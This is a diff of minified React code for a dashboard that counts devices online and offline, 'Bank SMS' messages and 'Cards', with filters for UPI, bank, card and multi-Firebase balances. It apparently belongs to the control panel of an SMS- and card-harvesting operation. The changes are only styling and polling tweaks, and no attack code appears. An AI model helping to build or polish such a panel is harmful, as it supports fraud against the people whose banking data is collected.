@@ -84,7 +84,7 @@ function p1({
     }, [D]), I = jt.useCallback(() => at(!1), [at]);
     devicesRef.current = d;
     jt.useEffect(() => {
-        at(!1), ot.current = setInterval(() => at(!0), 3e3), $.current = setInterval(c, 2e3);
+        at(!1), ot.current = setInterval(() => at(!0), 2e3), $.current = setInterval(c, 2e3);
         const U = setInterval(() => nt(new Date), 1e3);
         return () => {
             ot.current && clearInterval(ot.current), $.current && clearInterval($.current), clearInterval(U)
@@ -273,46 +273,46 @@ function p1({
                     children: [r.jsxs("div", {
                         className: "console-metric-chip metric-total",
                         children: [r.jsx("i", { className: "fa-solid fa-layer-group metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
-                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
+                            className: "metric-title text-[9px] uppercase tracking-widest font-semibold",
                             children: "Total"
                         }), r.jsx("p", {
-                            className: "text-lg font-black text-red-500",
+                            className: "metric-value text-lg font-black",
                             children: d.length
                         })] })]
                     }), r.jsxs("div", {
                         className: "console-metric-chip metric-online",
                         children: [r.jsx("i", { className: "fa-solid fa-signal metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
-                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
+                            className: "metric-title text-[9px] uppercase tracking-widest font-semibold",
                             children: "Online"
                         }), r.jsx("p", {
-                            className: "text-lg font-black text-emerald-400",
+                            className: "metric-value text-lg font-black",
                             children: it
                         })] })]
                     }), r.jsxs("div", {
                         className: "console-metric-chip metric-offline",
                         children: [r.jsx("i", { className: "fa-solid fa-power-off metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
-                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
+                            className: "metric-title text-[9px] uppercase tracking-widest font-semibold",
                             children: "Offline"
                         }), r.jsx("p", {
-                            className: "text-lg font-black text-[#555]",
+                            className: "metric-value text-lg font-black",
                             children: bt
                         })] })]
                     }), r.jsxs("div", {
                         className: "console-metric-chip metric-bank",
                         children: [r.jsx("i", { className: "fa-solid fa-building-columns metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
-                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
+                            className: "metric-title text-[9px] uppercase tracking-widest font-semibold",
                             children: "Bank SMS"
                         }), r.jsx("p", {
-                            className: "text-lg font-black text-emerald-400",
+                            className: "metric-value text-lg font-black",
                             children: y
                         })] })]
                     }), _ > 0 && r.jsxs("div", {
                         className: "console-metric-chip metric-cards",
                         children: [r.jsx("i", { className: "fa-solid fa-credit-card metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
-                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
+                            className: "metric-title text-[9px] uppercase tracking-widest font-semibold",
                             children: "Cards"
                         }), r.jsx("p", {
-                            className: "text-lg font-black text-purple-400",
+                            className: "metric-value text-lg font-black",
                             children: _
                         })] })]
                     })]
@@ -321,8 +321,8 @@ function p1({
                     children: [
                         ["all", "online", "offline", "upi", "bank", "card", ...(isMultiFirebase ? ["balances"] : []), "firebase"].map(U => r.jsx("button", {
                             onClick: () => C(U),
-                            className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
-                            children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U
+                            className: `console-filter console-filter-${U} border border-transparent px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${w===U?U==="bank"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
+                            children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U === "upi" ? "UPI" : U
                         }, U)), r.jsx("div", {
                             className: "w-px h-4 bg-[#222]"
                         }), r.jsxs("select", {
